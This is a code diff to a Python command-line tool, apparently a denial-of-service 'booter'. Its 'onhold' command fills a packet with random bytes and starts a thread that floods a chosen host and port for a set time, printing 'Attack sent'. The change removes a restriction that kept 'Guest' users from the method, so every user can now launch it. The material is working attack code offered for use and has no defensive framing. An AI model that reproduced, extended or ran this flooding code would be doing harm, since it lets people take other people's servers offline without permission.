@@ -94,22 +94,18 @@ def main():
 			print (banner)
 			main()
 		elif sinput == "onhold":
-			if username == "Guest":
-				print ("\033[31m[ONH\033[37mOLD] You Are Not Allowed To Use This Method.\n")
+			try:
+				sinput, host, port, timer, pack = sin.split(" ")
+				socket.gethostbyname(host)
+				print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
+				punch = random._urandom(int(pack))
+				threading.Thread(target=onholdsender, args=(host, port, timer, punch)).start()
+			except ValueError:
+				print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
 				main()
-			else:
-				try:
-					sinput, host, port, timer, pack = sin.split(" ")
-					socket.gethostbyname(host)
-					print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
-					punch = random._urandom(int(pack))
-					threading.Thread(target=onholdsender, args=(host, port, timer, punch)).start()
-				except ValueError:
-					print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
-					main()
-				except socket.gaierror:
-					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
-					main()
+			except socket.gaierror:
+				print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
+				main()
 		elif sinput == "stop":
 			print ("\033[31m[ONH\033[37mOLD] All Running Attacks Have Been Stopped.\n")
 			attack = False
